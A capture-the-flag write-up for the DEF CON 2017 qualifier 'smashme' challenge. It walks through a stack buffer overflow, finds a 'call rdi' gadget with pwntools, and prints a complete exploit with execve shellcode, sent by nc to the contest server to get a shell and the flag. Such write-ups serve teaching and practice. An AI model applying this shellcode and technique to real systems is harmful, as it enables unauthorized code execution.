# Writeup
The challenge gives the smashme executable and that's all.
Doing a reverse engineering, we can note three things:

1- The executable does not have any security protections. For example, the stack is executable.

2- The main function reads some bytes from stdin and has a buffer overflow vulnerability. 

![smashme1](https://cloud.githubusercontent.com/assets/1280700/25631344/76b71cfc-2f46-11e7-9bdc-5c29e8bb47f5.png)

3- The function sub_400320 refers to the strstr function. It means that to exploit the return, our 
input must have the string "Smash me outside, how bout dAAAAAAAAAAA" before any null byte.

A payload that reaches the return address is: *BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBSmash me outside, how bout dAAAAAAAAAAACCCCCCCC*, where CCCCCCCC is the return address.
Setting a breakpoint before the ret instruction (0x0000000000400a0f):

![smashme2](https://cloud.githubusercontent.com/assets/1280700/25631345/788d6054-2f46-11e7-8f9e-29e37621005e.png)

The problem is that ASLR is enabled remotely. Which address should we use for the return? Luckly,
the pointer for our string is stored in RDI (*RDI  0x7fffffffddf0 ◂— u'BBBBBBBBBBBBBBB...'*).
Therefore, we can replace the B's with our shellcode and look for any *jmp RDI* or *call RDI*
operation. The code of the executable does not have any of these instructions. However, the bytes 
that compose these instructions are very simple. For example, we can find the corresponding bytes
of *call RDI* at address 0x403582.

```python
>>> from pwn import *
>>> context.arch = "amd64"
>>> asm("call rdi")
'\xff\xd7'
>>> binary = elf.load("smashme")
[*] '/home/pedroysb/HTools/ctf/ctf-writeups/defcon-qualifier-2017/smashme/smashme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
>>> hex(next(binary.search("\xff\xd7")))
'0x403582'
```

Thus, we can build our payload and get a shell:
```
$ (python -c 'print("\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05Smash me outside, how bout dAAAAAAAAAAA" + "\x82\x35\x40\x00\x00\x00\x00\x00")'; cat) | nc smashme_omgbabysfirst.quals.shallweplayaga.me 57348
Welcome to the Dr. Phil Show. Wanna smash?
ls
flag
smashme
cat flag
The flag is: You must be at least this tall to play DEF CON CTF 5b43e02608d66dca6144aaec956ec68d
```
